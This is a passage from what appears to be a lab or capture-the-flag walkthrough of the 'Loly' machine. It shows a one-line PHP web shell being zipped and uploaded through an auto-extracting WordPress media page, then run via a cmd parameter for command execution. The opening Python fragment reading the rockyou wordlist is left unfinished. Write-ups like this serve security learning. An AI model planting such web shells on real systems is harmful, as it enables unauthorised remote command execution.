with open('/usr/share/wordlists/rockyou.txt',mode='r',encoding='utf-8', errors='ignore') as f:

Foothold

Back to the /wordpress page after logon, a new path Site Admin appeared.

On the admin page -> AdRoute -> Manage Media, I found zip uploading page. This page says two interesting stuff :

Zip files are automatically extracted in the location where they are uploaded and the original zip file will be deleted once extracted.

You can create top-level folders below

These mean, if we upload zip file on this page, this website automatically unzips the file and add it to root directory of the website. Therefore, I will zipped webshell file to the default dir '/banners', and get reverse shell.

└─$ echo '<?php system($_REQUEST[cmd]);?>' > simple_shell.php
└─$ zip simple_shell.zip simple_shell.php
  adding: simple_shell.php (stored 0%)

I prepared zip file. Next, let's upload it. I simply pressed browse button and select created zip file, and uploaded.

Navigating to url http://loly.lc/wordpress/wp-content/banners/simple_shell.php?cmd=id returned current user. We can establish reverse shell using this file.
